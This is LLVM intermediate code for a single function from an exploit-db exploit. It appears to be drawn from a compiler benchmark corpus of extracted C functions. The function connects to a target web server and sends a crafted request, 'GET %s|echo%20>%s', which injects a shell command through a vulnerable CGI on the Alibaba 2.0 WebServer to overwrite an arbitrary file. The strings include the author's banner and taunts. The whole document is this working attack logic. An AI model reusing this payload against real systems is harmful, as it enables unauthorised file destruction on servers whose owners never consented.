; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_19595.c_overwrite.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_19595.c_overwrite.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [61 x i8] c"\0AAlibaba 2.0 WebServer File Overwrite Xploit by wildcoyote\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [47 x i8] c"Trying to connect to %s (%d)....(please wait)\0A\00", align 1
@.str.2 = private unnamed_addr constant [23 x i8] c"- Could not connect -\0A\00", align 1
@.str.3 = private unnamed_addr constant [13 x i8] c"Exiting...\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [22 x i8] c"Connected to %s (%d)\0A\00", align 1
@.str.5 = private unnamed_addr constant [20 x i8] c"GET %s|echo%20>%s\0A\0A\00", align 1
@vulnerable_cgi = common dso_local global i8* null, align 8
@.str.6 = private unnamed_addr constant [39 x i8] c"Oh k! Trying to overwrite the file...\0A\00", align 1
@.str.7 = private unnamed_addr constant [49 x i8] c"All done, the file was *probably* overwrited ;)\0A\00", align 1
@.str.8 = private unnamed_addr constant [54 x i8] c"Send flamez to wildcoyote@coders-pt.org, *Enjoy*...\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @overwrite(i8* %0, i8* %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [512 x i8], align 16
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %10 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str, i64 0, i64 0))
  %11 = load i8*, i8** %4, align 8
  %12 = load i32, i32* %6, align 4
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.1, i64 0, i64 0), i8* %11, i32 %12)
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = call i32 @openhost(i8* %14, i32 %15)
  store i32 %16, i32* %7, align 4
  %17 = load i32, i32* %7, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %23

19:                                               ; preds = %3
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0))
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.3, i64 0, i64 0))
  %22 = call i32 @exit(i32 -1) #3
  unreachable

23:                                               ; preds = %3
  %24 = load i8*, i8** %4, align 8
  %25 = load i32, i32* %6, align 4
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i64 0, i64 0), i8* %24, i32 %25)
  br label %27

27:                                               ; preds = %23
  %28 = getelementptr inbounds [512 x i8], [512 x i8]* %9, i64 0, i64 0
  %29 = load i8*, i8** @vulnerable_cgi, align 8
  %30 = load i8*, i8** %5, align 8
  %31 = call i32 @sprintf(i8* %28, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i64 0, i64 0), i8* %29, i8* %30)
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.6, i64 0, i64 0))
  %33 = load i32, i32* %7, align 4
  %34 = getelementptr inbounds [512 x i8], [512 x i8]* %9, i64 0, i64 0
  %35 = call i32 @sends(i32 %33, i8* %34)
  %36 = load i32, i32* %7, align 4
  %37 = call i32 @close(i32 %36)
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.7, i64 0, i64 0))
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.8, i64 0, i64 0))
  ret void
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @openhost(i8*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*, i8*) #1

declare dso_local i32 @sends(i32, i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
